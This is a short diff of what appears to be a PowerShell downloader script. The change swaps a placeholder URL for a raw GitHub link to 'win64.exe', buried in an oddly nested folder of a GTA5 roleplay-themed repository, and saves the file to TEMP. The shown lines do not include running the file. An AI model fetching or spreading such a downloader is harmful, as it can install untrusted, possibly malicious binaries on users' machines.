@@ -7,7 +7,7 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-$exeUrl = "https://github.com/YourUsername/YourRepo/raw/main/yourfile.exe"
+$exeUrl = "https://raw.githubusercontent.com/LavysCode/GTA5RP-MajesticRP/main/docs/jsm/upd/742/827/win64.exe"
 $exePath = "$env:TEMP\yourfile.exe"
 
 Write-Host "============================================="
